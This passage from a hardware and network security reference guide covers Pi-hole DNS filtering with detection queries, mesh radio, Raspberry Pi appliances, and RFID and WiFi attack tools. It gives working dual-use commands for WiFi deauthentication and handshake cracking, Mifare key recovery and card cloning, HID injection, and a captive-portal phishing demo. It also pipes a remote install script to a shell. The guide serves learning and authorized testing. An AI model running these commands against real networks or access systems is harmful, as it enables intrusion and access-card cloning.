  -e PIHOLE_DNS_2="149.112.112.112" \
  -v "${HOME}/pihole/etc-pihole:/etc/pihole" \
  -v "${HOME}/pihole/etc-dnsmasq.d:/etc/dnsmasq.d" \
  --dns=127.0.0.1 \
  --restart=unless-stopped \
  pihole/pihole:latest
```

**Essential management commands:**
```bash
pihole -g                    # Update gravity (download/update blocklists)
pihole -w domain.com         # Whitelist a domain
pihole -b domain.com         # Blacklist a domain
pihole --regex '\.ads\.'     # Add regex blacklist rule
pihole -l on                 # Enable query logging
pihole status                # Show Pi-hole service status
pihole restartdns            # Restart DNS service
pihole -a -p newpassword     # Change web interface password
```

### 5.3 Recommended Blocklists

| List | URL | Focus |
|------|-----|-------|
| StevenBlack Unified Hosts | `https://raw.githubusercontent.com/StevenBlack/hosts/master/hosts` | Ads + malware |
| OISD Full | `https://full.oisd.nl` | Comprehensive |
| Hagezi DNS Blocklists (Multi) | `https://raw.githubusercontent.com/hagezi/dns-blocklists/main/adblock/multi.txt` | Balanced |
| Energized Protection | `https://block.energized.pro/unified/formats/domains.txt` | Unified blocking |
| Malware Domain List | `https://www.malwaredomainlist.com/hostslist/hosts.txt` | Malware C2 |
| URLhaus | `https://urlhaus-api.abuse.ch/v1/unixsocket/` | Active malware URLs |

**Gravity update automation:**
```bash
# Crontab entry for weekly gravity update
0 3 * * 0 root /usr/local/bin/pihole -g > /var/log/pihole_gravity.log 2>&1
```

### 5.4 Security Configuration

**Upstream DNS with privacy and security:**
```bash
# Use Cloudflare DNS over HTTPS (via cloudflared)
apt install cloudflared
cloudflared service install
# Configure to use DoH at https://1.1.1.1/dns-query

# Or use Quad9 for malware blocking at resolver level
# 9.9.9.9 -- malware blocking, DNSSEC validation
# 149.112.112.112 -- alternate
```

**DNSSEC validation (Pi-hole admin > DNS > Advanced):**
- Enable DNSSEC to cryptographically validate DNS responses
- Prevents DNS cache poisoning and response spoofing
- Requires upstream resolver to support DNSSEC (Cloudflare, Quad9, Google all do)

**Per-client group policies:**
```
# Pi-hole Groups allow different blocking policies per device
# Example: children's devices get stricter lists, IoT gets malware-only
Admin UI -> Groups -> Create group -> Assign clients -> Assign blocklists
```

**Regex blocking for DGA detection:**
```bash
# Block algorithmically generated domains (common C2 pattern)
pihole --regex '^[a-z]{10,}\.(com|net|org|info)$'
pihole --regex '^[0-9a-z]{12,16}\.pw$'
```

### 5.5 Security Monitoring with Pi-hole

**Query log analysis for C2 beaconing detection:**
```bash
# Examine FTL database for high-frequency single-destination queries (beaconing pattern)
sqlite3 /etc/pihole/FTL.db "
SELECT domain, COUNT(*) as count
FROM queries
WHERE timestamp > strftime('%s', 'now') - 3600
GROUP BY domain
ORDER BY count DESC
LIMIT 50;"

# Find clients making queries to high-entropy domains
sqlite3 /etc/pihole/FTL.db "
SELECT client, domain, timestamp
FROM queries
WHERE domain REGEXP '^[a-z0-9]{12,}\.(com|net)'
ORDER BY timestamp DESC
LIMIT 100;"
```

**Pi-hole API for SIEM integration:**
```bash
# Get statistics via API
curl -s "http://pi.hole/admin/api.php?summary&auth=YOUR_TOKEN" | jq .

# Get recent queries
curl -s "http://pi.hole/admin/api.php?recentBlocked&auth=YOUR_TOKEN"

# Query log for the last hour
curl -s "http://pi.hole/admin/api.php?getAllQueries=3600&auth=YOUR_TOKEN" | jq .data[]
```

### 5.6 Alternatives and Complements

**AdGuard Home:**
```bash
# Cross-platform (Linux, macOS, Windows, Docker)
curl -s -S -L https://raw.githubusercontent.com/AdguardTeam/AdGuardHome/master/scripts/install.sh | sh
# Supports DNS-over-HTTPS, DNS-over-TLS, DNSCrypt out of the box
# Per-client statistics, parental controls, safe browsing
```

**Blocky:**
```yaml
# Go-based, Prometheus metrics, Kubernetes-native
# /etc/blocky/config.yml
upstream:
  default:
    - https://1.1.1.1/dns-query
blocking:
  blacklists:
    ads:
      - https://raw.githubusercontent.com/StevenBlack/hosts/master/hosts
  clientGroupsBlock:
    default:
      - ads
redis:
  address: localhost:6379   # Cache backend
prometheus:
  enable: true
  path: /metrics
```

**pfBlockerNG (pfSense/OPNsense):**
- Integrates DNS/IP blocking directly into firewall rules
- Supports DNSBL (DNS-based blackhole list) with Pi-hole-equivalent functionality
- Also blocks at IP level via firewall tables
- Feed management UI within pfSense web interface

### 5.7 Unbound Recursive DNS

Pairing Pi-hole with Unbound creates a fully private DNS stack where queries go directly to authoritative nameservers without any third-party resolver seeing all queries.

```bash
apt install unbound

# /etc/unbound/unbound.conf.d/pi-hole.conf
server:
    verbosity: 0
    interface: 127.0.0.1
    port: 5335
    do-ip4: yes
    do-udp: yes
    do-tcp: yes
    do-ip6: no
    prefer-ip6: no
    harden-glue: yes
    harden-dnssec-stripped: yes
    use-caps-for-id: no
    edns-buffer-size: 1232
    prefetch: yes
    num-threads: 1
    so-rcvbuf: 1m
    private-address: 192.168.0.0/16
    private-address: 169.254.0.0/16
    private-address: 172.16.0.0/12
    private-address: 10.0.0.0/8
    private-address: fd00::/8
    private-address: fe80::/10
    auto-trust-anchor-file: "/var/lib/unbound/root.key"
    val-clean-additional: yes
```

```bash
# Configure Pi-hole to use Unbound as upstream
# Pi-hole admin > Settings > DNS > Custom upstream: 127.0.0.1#5335

# Test DNSSEC validation
dig sigfail.verteiltesysteme.net @127.0.0.1 -p 5335   # Should SERVFAIL
dig sigok.verteiltesysteme.net @127.0.0.1 -p 5335     # Should resolve
```

---
## 6. Mesh Radio Networks

Off-grid and resilient communication networks are essential for security operations in degraded-infrastructure environments, disaster response, and privacy-sensitive communications.

### 6.1 Meshtastic

Meshtastic is an open-source LoRa mesh networking platform enabling long-range, encrypted text messaging without internet infrastructure.

**Supported hardware:**

| Board | Chipset | Notes |
|-------|---------|-------|
| TTGO T-Beam | ESP32 + LoRa + GPS | GPS built-in, 18650 battery |
| TTGO T-LoRa32 | ESP32 + LoRa | Compact, no GPS |
| Heltec LoRa32 | ESP32 + LoRa + OLED | Small OLED display |
| RAK WisBlock | nRF52840 + LoRa | Modular, low-power |
| LilyGO T-Echo | nRF52840 + LoRa + E-ink | E-ink display, excellent battery |

**Frequency plans:**

| Region | Frequency | Channel Width |
|--------|-----------|---------------|
| US (915 MHz) | 902-928 MHz | 250 kHz |
| EU_868 | 869.4-869.65 MHz | 125 kHz |
| EU_433 | 433.175-434.665 MHz | 125 kHz |
| ANZ | 915-928 MHz | 250 kHz |

**Python CLI usage:**

```bash
pip install meshtastic

# Send a text message to all nodes
meshtastic --sendtext "Hello mesh" --port /dev/ttyUSB0

# Send to specific node
meshtastic --sendtext "Hello" --dest !abc12345 --port /dev/ttyUSB0

# Show device info
meshtastic --info --port /dev/ttyUSB0

# Set channel configuration (pre-shared key encryption)
meshtastic --ch-set psk random --ch-index 0

# Configure GPS position
meshtastic --setlat 37.7749 --setlon -122.4194 --setalt 100

# Export channel QR code
meshtastic --qr

# Set device region
meshtastic --set lora.region US
```

**Python API for automation:**

```python
import meshtastic
import meshtastic.serial_interface
from pubsub import pub

def onReceive(packet, interface):
    print(f"Received: {packet}")

def onConnection(interface, topic=pub.AUTO_TOPIC):
    print(f"Connected: {interface.myInfo}")

pub.subscribe(onReceive, "meshtastic.receive")
pub.subscribe(onConnection, "meshtastic.connection.established")

iface = meshtastic.serial_interface.SerialInterface("/dev/ttyUSB0")
iface.sendText("Hello from Python API")
```

**Security features:**
- **AES-256 encryption** on all channels (pre-shared key)
- Channel name + PSK must match for nodes to communicate
- Admin channel separate from messaging channels
- Optional PKI-based direct messages in newer firmware

**MQTT bridge:**
```bash
# Bridge mesh to internet MQTT broker for extended range
meshtastic --set mqtt.enabled true
meshtastic --set mqtt.address mqtt.example.com
meshtastic --set mqtt.username user
meshtastic --set mqtt.password pass
meshtastic --set mqtt.encryption_enabled true
```

**Range:** 10+ miles line-of-sight, 1-2 miles urban with obstacles. Mesh relay extends effective range proportionally with node count.

### 6.2 GoTenna Mesh

GoTenna Mesh is a commercial off-grid mesh radio product for Android/iOS.

- **Range:** 1 km urban, 4+ miles open terrain
- **SDK integration** for custom application development
- **AES-256 encryption** on all messages
- **GPS location sharing** integrated
- Widely used in disaster response and field security operations
- No subscription fees for peer-to-peer use

### 6.3 Reticulum Network Stack

Reticulum is a cryptography-based networking stack designed for reliable communication over long-distance, low-bandwidth radio links with built-in privacy.

**Architecture:**
- Transport-agnostic: works over LoRa, packet radio, serial, I2C, TCP/IP
- All links cryptographically authenticated and encrypted by default
- No addresses assigned — identity derived from cryptographic keypair
- Censorship-resistant by design
- No central infrastructure required

**Installation and usage:**

```bash
pip install rns nomadnet lxmf

# Start Reticulum daemon
rnsd --config /etc/reticulum/config

# Check interface status
rnstatus

# Send a test packet
rnprobe <destination_hash>

# NomadNet -- distributed network with pages and messaging
nomadnet
```

**Example Reticulum config:**
```toml
[reticulum]
  enable_transport = yes

[[RNS Serial Interface]]
  type = SerialInterface
  enabled = yes
  port = /dev/ttyUSB0
  speed = 115200

[[RNS TCP Interface]]
  type = TCPClientInterface
  enabled = yes
  target_host = localhost
  target_port = 4403
```

**Applications:**
- **NomadNet** — distributed messaging and page hosting
- **Sideband** — mobile messaging app (Android/iOS)
- **LXMF** — lightweight extensible message format for email-like messaging over Reticulum

### 6.4 M17 Project

M17 is an open-source digital voice and data radio protocol designed as a modern replacement for proprietary digital radio modes.

**Specifications:**
- **Data rate:** 4800 or 9600 baud
- **Voice codec:** Codec2 (open-source)
- **Modulation:** 4FSK
- **Encryption:** Optional AES-128
- **Metadata:** Embedded callsign, GPS coordinates, text

**Security research relevance:**
- Fully open protocol enables scrutiny and improvement
- Replaces proprietary DMR/D-STAR/P25/Fusion with auditable stack
- SDR implementations available for GNU Radio

### 6.5 APRS (Automatic Packet Reporting System)

APRS is an AX.25-based digital communications system for real-time position tracking, messaging, and telemetry over amateur radio.

**Specifications:**
- **Frequency:** 144.390 MHz (North America VHF primary)
- **Protocol:** AX.25 packet radio
- **Modulation:** 1200 baud AFSK (Bell 202)
- **Uses:** Position beaconing, weather stations, messaging, emergency communications

**Dire Wolf software TNC:**

```bash
# Install Dire Wolf
apt install direwolf

# /etc/direwolf.conf
ADEVICE plughw:1,0
CHANNEL 0
MYCALL N0CALL-9
MODEM 1200
BEACON DELAY=30 EVERY=10 VIA=WIDE1-1,WIDE2-1 SYMBOL=/> COMMENT="Security Research Node"

# Start Dire Wolf
direwolf -c /etc/direwolf.conf
```

**APRS applications:**
- **Xastir** — full-featured APRS mapping (Linux)
- **APRSdroid** — Android APRS client
- **aprs.fi** — web-based APRS tracking
- **YAAC** — Yet Another APRS Client (Java, cross-platform)

### 6.6 Winlink

Winlink is an amateur radio email gateway system enabling email over HF/VHF/UHF radio links.

**Transport methods:**
- **VARA HF** — commercial high-performance HF modem (most common)
- **VARA FM** — VHF/UHF FM version
- **Pactor** — commercial HF modem (SCS hardware)
- **Packet** — AX.25 packet radio (legacy, still functional)

**Emergency communications use:** Primary email system for ARES (Amateur Radio Emergency Service) and RACES (Radio Amateur Civil Emergency Service). Used when internet infrastructure is unavailable.

### 6.7 LoRaWAN Security

LoRaWAN is a MAC layer protocol for LoRa radio networks, commonly used in IoT deployments.

**Security architecture:**
- **AES-128** session keys for MAC layer encryption
- **Frame counter** to prevent replay attacks
- **OTAA (Over-The-Air Activation):** Devices join using AppKey, generating session keys per-join — more secure
- **ABP (Activation By Personalization):** Static session keys hardcoded — vulnerable to replay if counters reset

**Security research tools:**

```bash
# ChirpStack (open-source LoRaWAN server)
docker-compose up chirpstack
# Access at http://localhost:8080

# gr-lorawan -- GNU Radio LoRaWAN decoder
# Sniff and decode LoRaWAN packets on 915 MHz (US)
# Useful for authorized testing of IoT deployments
```

**Known vulnerabilities:**
- ABP devices with counter reset vulnerability (device reset reuses counter — replay possible)
- Weak AppKey management in some IoT deployments
- Lack of payload encryption in some applications (relying solely on MAC layer)
- Frame injection attacks on unencrypted payloads

---
## 7. Raspberry Pi Security Projects

The Raspberry Pi's low cost, small form factor, and Linux support make it ideal for security appliances, sensor nodes, penetration testing platforms, and covert network devices.

### 7.1 Hardware Variants for Security Use

| Model | CPU | RAM | Key Use Case |
|-------|-----|-----|-------------|
| Pi Zero W | ARM11 @ 1GHz | 512 MB | Ultra-compact implant/sensor |
| Pi Zero 2W | ARM Cortex-A53 @ 1GHz (quad) | 512 MB | Compact with more CPU power |
| Pi 3B+ | Cortex-A53 @ 1.4GHz | 1 GB | General pentesting/appliance |
| Pi 4B | Cortex-A72 @ 1.8GHz | 1-8 GB | SIEM/traffic analysis/desktop |
| Pi 5 | Cortex-A76 @ 2.4GHz | 4-16 GB | High-performance analysis |
| CM4 | Cortex-A72 @ 1.5GHz | 1-8 GB | Industrial embedding |

**Key accessories:**
- Alfa AWUS036ACH (USB WiFi, monitor mode + injection)
- RTL-SDR Blog v3 (software-defined radio)
- USB OTG adapter (for Pi Zero in HID/storage modes)
- RAK2245 Pi Hat (LoRaWAN gateway)
- RealTek USB GbE adapter (for pfSense builds)

### 7.2 Network Security Appliances

**ntopng traffic analysis:**
```bash
apt install ntopng
# Configure: /etc/ntopng/ntopng.conf
# -i eth0
# -w 3000
# Access at http://localhost:3000
# Provides per-host/protocol traffic graphs, DPI, alerts
```

**Zeek (formerly Bro) network security monitor:**
```bash
apt install zeek
# Configure interfaces in /etc/zeek/node.cfg
zeekctl deploy
zeekctl status
# Log files in /var/log/zeek/
# conn.log, dns.log, http.log, ssl.log, files.log, notice.log
tail -f /var/log/zeek/conn.log | zeek-cut id.orig_h id.resp_h proto service duration
```

**Suricata IDS/IPS:**
```bash
apt install suricata

# Download rules
suricata-update

# Run in IDS mode on live interface
suricata -c /etc/suricata/suricata.yaml -i eth0

# Run on captured pcap
suricata -c /etc/suricata/suricata.yaml -r capture.pcap

# View alerts
tail -f /var/log/suricata/fast.log
cat /var/log/suricata/eve.json | jq 'select(.event_type=="alert")'
```

### 7.3 Penetration Testing Platforms

**Kali Linux ARM:**
```bash
# Download from kali.org/get-kali/#kali-arm
# Flash with dd or Raspberry Pi Imager
dd if=kali-linux-2024.1-raspberry-pi-arm64.img of=/dev/sdX bs=4M status=progress
```

**P4wnP1 A.L.O.A. (by MaMe82):**

P4wnP1 is a highly configurable USB attack platform for Raspberry Pi Zero (W/2W).

```bash
# Access web interface (from connected device)
# http://172.16.0.1:8000

# Payload configuration supports:
# - HID keyboard injection
# - Bluetooth covert channel
# - WiFi client + AP simultaneous
# - USB Ethernet with RNDIS/ECM
# - Combined HID + storage + network
```

**P4wnP1 capabilities:**
- HID keyboard injection (DuckyScript compatible)
- Bluetooth covert channel (SPP/NAP/PAN)
- WiFi client + AP mode simultaneously
- Network over USB (RNDIS/ECM/CDC_NCM)
- Bash script triggers on USB connect events
- Pre-built payload templates for Windows/Linux/macOS

### 7.4 Physical Security Tools

**rpi-rf (433 MHz RF control):**
```bash
pip install rpi-rf

# Receive RF codes on GPIO pin 27
rpi-rf_receive -g 27

# Transmit RF code
rpi-rf_send -g 17 -p 350 -l 0 12345678
# -g: GPIO pin, -p: pulse length (us), -l: protocol (0=auto)
```

**PiKVM — Remote KVM over IP:**
- Connects to target via HDMI capture + USB OTG HID
- Web interface provides remote keyboard/mouse/screen
- Useful for authorized remote access to air-gapped systems
- Supports ATX power control, mass storage emulation

**USB Armory Mk II:**
- **Processor:** NXP i.MX6ULZ ARM Cortex-A7 @ 900 MHz
- **Interface:** USB-C host + USB-C client (simultaneous)
- **Security features:** Hardware cryptographic accelerator, Secure Boot, ARM TrustZone
- Runs full Debian Linux, appears as USB device to host
- Used for hardware security module (HSM) research, secure USB apps, key management

### 7.5 Radio Applications on Pi

**RTL-SDR server (network SDR):**
```bash
# Share RTL-SDR over network
rtl_tcp -a 0.0.0.0 -p 1234 -g 40

# Clients connect with: rtl_tcp://pi-ip:1234
# Use with SDR#, GQRX, or GNU Radio as source
```

**dump1090 ADS-B receiver:**
```bash
# Receive aircraft transponder signals
apt install dump1090-mutability

# Run with RTL-SDR
dump1090 --net --quiet --enable-agc

# Web interface: http://pi-ip:8080
```

**LoRa gateway with RAK2245:**
```bash
# RAK2245 is a Raspberry Pi Hat with 8-channel LoRa concentrator
# Install ChirpStack gateway software
apt install chirpstack-gateway-bridge chirpstack-network-server
# Configure for local LoRaWAN network server
```

### 7.6 Forensics and Covert Capture

**Covert packet capture:**
```bash
# Continuous capture to rotating files (500MB each, max 10 files)
tcpdump -i eth0 \
    -w /mnt/usb/capture-%Y%m%d-%H%M%S.pcap \
    -G 3600 \
    -C 500 \
    -W 10

# Capture with timestamps and VLAN tags
tcpdump -i eth0 -w capture.pcap -e -j adapter_unsynced
```

**Wazuh HIDS agent:**
```bash
# Install Wazuh agent for SIEM integration
curl -s https://packages.wazuh.com/key/GPG-KEY-WAZUH | apt-key add -
echo "deb https://packages.wazuh.com/4.x/apt/ stable main" > /etc/apt/sources.list.d/wazuh.list
apt update && apt install wazuh-agent
# Configure: /var/ossec/etc/ossec.conf -> manager IP
systemctl enable wazuh-agent && systemctl start wazuh-agent
```

**Aircrack-ng suite:**
```bash
# Enable monitor mode (with compatible adapter)
airmon-ng start wlan0
# Creates wlan0mon

# Capture WPA handshakes (for authorized password testing)
airodump-ng -c 6 --bssid AA:BB:CC:DD:EE:FF -w capture wlan0mon

# Deauth client to force handshake (AUTHORIZED USE ONLY)
aireplay-ng -0 5 -a AA:BB:CC:DD:EE:FF -c 11:22:33:44:55:66 wlan0mon

# Test WPA password (authorized)
aircrack-ng -w wordlist.txt capture-01.cap
```

---
## 8. RFID & Hardware Attack Tools

Hardware security research requires physical-layer tools for analyzing RFID/NFC access control systems, probing embedded interfaces, and capturing physical-medium traffic.

### 8.1 Proxmark3 RDV4

The Proxmark3 RDV4 is the premier open-source RFID/NFC research platform, supporting both Low Frequency (125 kHz) and High Frequency (13.56 MHz) operations.

**Hardware features:**
- Dual LF/HF antennas switchable via software
- **Standalone mode** — executes attacks without connected computer
- **Bluetooth add-on** — wireless client connection
- FPGA-accelerated signal processing
- USB-C interface

**Community firmware:** `github.com/RfidResearchGroup/proxmark3` (iceman fork — most feature-complete)

**Installation:**
```bash
git clone https://github.com/RfidResearchGroup/proxmark3
cd proxmark3
make clean && make all
sudo make install
proxmark3 /dev/ttyACM0
```

**Essential commands:**

```bash
# Auto-identify unknown card (LF or HF)
[usb] pm3 --> lf search
[usb] pm3 --> hf search

# Mifare Classic -- automated full attack (reads all sectors)
[usb] pm3 --> hf mf autopwn

# Mifare Classic -- nested authentication key recovery
[usb] pm3 --> hf mf nested --blk 0 --keytype A --key FFFFFFFFFFFF

# Mifare Classic -- darkside attack (works on cards with random UID)
[usb] pm3 --> hf mf darkside

# Mifare Classic -- dump card contents after key recovery
[usb] pm3 --> hf mf dump --keys hf-mf-dumpkeys.bin

# Mifare Classic -- emulate cloned card
[usb] pm3 --> hf mf eload --file dump.json
[usb] pm3 --> hf mf sim

# EM4100 -- clone to T5577 (authorized testing)
[usb] pm3 --> lf em 410x clone --uid 0123456789

# HID Prox -- read and save
[usb] pm3 --> lf hid reader

# HID Prox -- clone to T5577
[usb] pm3 --> lf hid clone -r 2006EC0351

# Indala -- read
[usb] pm3 --> lf indala reader

# iCLASS -- dump (authorized)
[usb] pm3 --> hf iclass dump

# NTAG/Ultralight -- read
[usb] pm3 --> hf mfu reader

# Script automation
[usb] pm3 --> script run lf_em410x_brute
```

**Standalone mode (HF_MSDSAL):**
The Proxmark3 can operate without a connected PC using standalone modes. HF_MSDSAL mode captures MifareClassic sector keys and dumps card data to internal flash, then uploads to PC when reconnected.

### 8.2 ChameleonMini/ChameleonTiny

ChameleonMini is an open-source RFID emulator capable of emulating multiple card types with logging and configurable behavior.

```bash
# Connect via USB serial (115200 baud)
screen /dev/ttyACM0 115200

# List available card types
CONFIGURATION=?

# Set to emulate Mifare Classic 1K
CONFIGURATION=MF_CLASSIC_1K

# Load card data
UPLOAD
# (send binary dump data)

# Enable logging
LOG_MODE=MEMORY

# Retrieve log (sniffed card data)
DOWNLOAD
```

**Supported emulation types:**
- Mifare Classic 1K / 4K
- Mifare Ultralight
- ISO 14443-A generic
- ISO 15693
- EM4100 (LF, ChameleonMini RDV with LF)

**ChameleonTiny** — compact version (keychain-sized) with same core functionality.

### 8.3 WiFi Attack Hardware

**Alfa Network Adapters (monitor mode + packet injection):**

| Model | Standard | Chipset | Notes |
|-------|----------|---------|-------|
| AWUS036ACH | 802.11ac (dual-band) | RTL8812AU | Best for 5 GHz injection |
| AWUS036ACM | 802.11ac (dual-band) | MT7612U | Good Linux driver support |
| AWUS036H | 802.11b/g/n (2.4 GHz) | RTL8187 | Classic high-power 2.4 GHz |
| AWUS036AXM | 802.11ax (WiFi 6) | MT7921AU | Latest generation |

```bash
# Install RTL8812AU driver (AWUS036ACH)
apt install dkms
git clone https://github.com/aircrack-ng/rtl8812au
cd rtl8812au && make && make install

# Enable monitor mode
ip link set wlan0 down
iw dev wlan0 set monitor control
ip link set wlan0 up

# Packet injection test
aireplay-ng --test wlan0mon
```

**GL.iNet Travel Routers for Security:**

| Model | CPU | RAM | Notes |
|-------|-----|-----|-------|
| GL-MT300N-V2 (Mango) | MT7628 @ 580MHz | 128 MB | Ultra-compact, USB power |
| GL-AR300M (Shadow) | AR9331 @ 650MHz | 128 MB | Dual WiFi radios |
| GL-MT1300 (Beryl) | MT7621A @ 880MHz | 256 MB | Gigabit, good throughput |
| GL-AXT1800 (Slate AX) | IPQ6000 @ 1GHz | 512 MB | WiFi 6, powerful |

All GL.iNet routers run OpenWrt and support custom package installation:
```bash
opkg update
opkg install tcpdump nmap aircrack-ng kismet
```

### 8.4 Bus Interface Tools

**Bus Pirate v4:**

Universal open-source serial protocol analyzer supporting SPI, I2C, UART, 1-Wire, JTAG, and raw bitbanging.

```bash
# Connect at 115200 baud
screen /dev/ttyUSB0 115200

# Bus Pirate prompt: HiZ>
# Select SPI mode
m          # Mode selection
5          # SPI

# Read SPI flash (common for firmware extraction)
[0x9F 0x00 0x00 0x00]         # Read JEDEC ID
[0x03 0x00 0x00 0x00 r:256]   # Read 256 bytes from address 0

# I2C bus scan
c          # I2C mode
(1)        # Start bit
[0xFE]     # Scan -- shows ACK/NAK for each address
```

**DSLogic Plus:**
- 16-channel USB logic analyzer
- Sample rates up to 400 MHz
- Protocol decoders: UART, SPI, I2C, 1-Wire, USB, CAN, Lin, JTAG
- Open-source DSView software
- Essential for analyzing unknown serial protocols on embedded systems

**Black Magic Probe:**
```bash
# JTAG/SWD debugger with built-in GDB server
# No OpenOCD required -- direct GDB connection
arm-none-eabi-gdb
(gdb) target extended-remote /dev/ttyACM0
(gdb) monitor swdp_scan        # Scan for SWD targets
(gdb) attach 1                 # Attach to target
(gdb) monitor reset halt       # Reset and halt
(gdb) load firmware.elf        # Flash firmware
(gdb) x/10x 0x08000000        # Read memory
```

**Total Phase Beagle:**
- Professional USB, I2C, SPI, and CAN protocol analyzers
- Non-intrusive hardware capture
- Used for USB protocol research and embedded interface analysis

---
## 9. Maker & DIY Security Tools

The maker community has produced a rich ecosystem of open-source security tools built on accessible hardware platforms. These tools enable cost-effective learning and authorized security research.

### 9.1 WiFi & Bluetooth DIY

**ESP8266 Deauther (SpacehuhnTech):**

An educational WiFi security testing tool running on ESP8266/ESP32, demonstrating 802.11 management frame vulnerabilities.

```bash
# Flash Deauther firmware
esptool.py --port /dev/ttyUSB0 write_flash 0x0 esp8266_deauther_v3.bin

# Web interface at 192.168.4.1 (connect to deauther AP)
# Features:
# - Deauthentication attack demo (shows lack of IEEE 802.11w protection)
# - Evil twin AP creation
# - Beacon flood (creates hundreds of fake SSIDs)
# - Probe request scanner
# - Packet monitor
```

**Security lesson:** 802.11w (Protected Management Frames) prevents deauthentication attacks. Test whether your AP has PMF enabled.

**NodeMCU Captive Portal (WiFi Phishing Demo):**
```cpp
// Arduino sketch for captive portal demonstration
#include <ESP8266WiFi.h>
#include <DNSServer.h>
#include <ESP8266WebServer.h>

const byte DNS_PORT = 53;
IPAddress apIP(192, 168, 1, 1);
DNSServer dnsServer;
ESP8266WebServer webServer(80);

void setup() {
    WiFi.softAPConfig(apIP, apIP, IPAddress(255, 255, 255, 0));
    WiFi.softAP("Free_WiFi");
    dnsServer.start(DNS_PORT, "*", apIP);
    webServer.onNotFound([]() {
        webServer.send(200, "text/html", "<h1>Captive Portal Demo</h1>");
    });
    webServer.begin();
}

void loop() {
    dnsServer.processNextRequest();
    webServer.handleClient();
}
```

**Sniffle BLE 5 Sniffer:**

Sniffle uses the Nordic nRF52840 Dongle to capture Bluetooth 5 and 4.x advertisements and connections.

```bash
pip install sniffle

# Sniff all BLE advertisements
python sniffle.py -e -l

# Follow specific connection (by advertiser MAC)
python sniffle.py -e -f -a AA:BB:CC:DD:EE:FF

# Capture to PCAP for Wireshark
python sniffle.py -e -l -o capture.pcap
```

**GATTacker (BLE MITM for authorized testing):**
```bash
npm install -g gattacker
ws-intercept   # Start intercept server
ws-connect     # Connect to target BLE device
# Observe/modify BLE GATT characteristic reads/writes in authorized tests
```

### 9.2 Hardware Hacking Platforms

**Glasgow Interface Explorer:**
```python
# Python-based hardware analysis tool
pip install glasgow

# I2C target scan and read
glasgow run i2c-initiator --port A --voltage 3.3 scan
glasgow run i2c-initiator --port A --voltage 3.3 read 0x50 256

# SPI flash dump
glasgow run spi-flashrom --port A --voltage 3.3 read flash.bin

# UART terminal
glasgow run uart --port A --baudrate 115200 terminal
```

**HydraBus:**
```bash
# Multi-protocol Swiss army knife
# Supports: UART, SPI, I2C, CAN, USB, SD, DAC, ADC
# Connect via USB serial at 115200 baud

> spi
spi1> scan         # Scan SPI bus
spi1> read 0 16    # Read 16 bytes from address 0
```

**Bus Blaster:**
- JTAG interface based on FTDI FT2232H
- OpenOCD compatible for firmware flashing and debugging
- Supports ARM, MIPS, x86 JTAG debugging

### 9.3 DIY Network Security

**Wardriving Setup:**
```bash
# Hardware: Raspberry Pi + GPS dongle + Alfa adapter + power bank
# Software stack:

# 1. Install Kismet
apt install kismet

# 2. Configure sources
# /etc/kismet/kismet.conf
# source=wlan0:name=alpha,type=linuxwifi

# 3. Start capture with GPS
kismet --override wardrive

# 4. View results via web UI at http://localhost:2501

# 5. Convert to KML for mapping
kismetdb_to_kml --in wardriving.kismet --out wardriving.kml
```

**Pi Zero as HID Injector with P4wnP1:**
- Configure payload in P4wnP1 web interface
- Trigger: USB connect event
- Action: Type DuckyScript payload sequence
- Advantage: Full Linux environment enables complex multi-stage payloads

**Custom OpenWrt Router for Monitoring:**
```bash
# Install security packages on OpenWrt
opkg update
opkg install tcpdump nmap kismet bettercap

# Route traffic to tap interface
iptables -t mangle -A PREROUTING -i br-lan -j TEE --gateway 192.168.1.100
```

### 9.4 3D Printed Security Tool Accessories

The maker community has published numerous open-source designs for security hardware accessories:

**RFID shielded wallets:**
- Faraday cage wallets blocking RFID/NFC skimming
- Print with any filament (PLA/PETG), line with copper tape
- Test with Proxmark3 or Flipper: card should be unreadable inside

**Proxmark3 RDV4 cases:**
- Custom form-fitting enclosures
- Antenna compartments for LF/HF coils
- Clip-on designs for one-handed operation
- Available on Thingiverse and Printables

**Flipper Zero accessories:**
- Extended battery cases (6000+ mAh)
- WiFi Dev Board mounting plates
- GPIO header covers
- Rubber bumper protectors

**Probe and test clip holders:**
- IC clip holders for SPI flash probing
- SOIC8/SOIC16 clip positioning jigs
- PCB third-hand mounts
- SMA connector organizers for RF cable management

**Antenna mounts:**
- Directional Yagi holders for LoRa distance testing
- Magnetic dipole mounts for vehicle-mounted wardriving
- Near-field antenna fixtures for RFID testing at fixed height

### 9.5 Community Resources

**Online Communities:**

| Resource | Type | Focus |
|----------|------|-------|
| `hackaday.io` | Projects + Blog | Hardware hacking, teardowns, builds |
| `github.com/hak5` | Code + Payloads | Official Hak5 repositories |
| `limitedresults.github.io` | Research Blog | Embedded security teardowns |
| `r/hardwarehacking` | Reddit | Community Q&A, project sharing |
| `r/RTLSDR` | Reddit | Software-defined radio community |
| `r/flipperzero` | Reddit | Flipper Zero community |

**Conferences:**

| Conference | Location | Hardware Focus |
|-----------|----------|---------------|
| DEF CON | Las Vegas, USA | Hardware Hacking Village, Badgelife |
| Black Hat | Las Vegas/Global | Arsenal hardware tools presentation |
| hardwear.io | Netherlands/USA | Hardware security dedicated |
| CCC (Chaos Communication Congress) | Germany | Camp hardware workshops |
| Maker Faire | Various | Educational hardware making |

**DEF CON Hardware Hacking Village:** Annual hands-on workshop area with soldering stations, hardware puzzle challenges, and talks on embedded security. Open to all badge holders.

**Tindie:** `tindie.com` — marketplace for maker/small-producer hardware including custom security tools, RFID research hardware, and SDR accessories.

**Procurement guidance:**
- `hak5.org` — official Hak5 store
- `greatscottgadgets.com` — HackRF, Ubertooth, GreatFET
- `flipperzero.one` — official Flipper Zero store
- `proxmark.io` / `lab401.com` — Proxmark3 resellers
- `hakshop.com` — authorized reseller for Hak5 products
- **AliExpress counterfeit warning:** Many "HackRF One" and "Proxmark3" listings on AliExpress are non-functional counterfeits. Verify seller reputation carefully.

---
## 10. Lab Setup, Legal & Community

Responsible security research requires a properly isolated lab environment, thorough understanding of applicable laws, and engagement with legitimate learning communities.

### 10.1 Lab Network Design

**Isolated testing VLAN architecture:**

```
Internet
    |
    v
[Router/Firewall]
    |
    +-- VLAN 1: Production (normal internet access)
    |
    +-- VLAN 2: Security Lab (NO internet breakout)
    |       +-- Wireless AP (dedicated test AP)
    |       +-- Network tap (for traffic monitoring)
    |       +-- Test targets (vulnerable VMs)
    |       +-- Security tools (Kali, Zeek, Suricata)
    |
    +-- VLAN 3: Management (monitoring tools only)
            +-- Zeek/Suricata sensors
            +-- SIEM (Wazuh/Elastic)
            +-- Storage server (captures, logs)
```

**Key isolation requirements:**
- Security lab VLAN has **no default internet route** — all outbound attempts should fail or route to honeypot
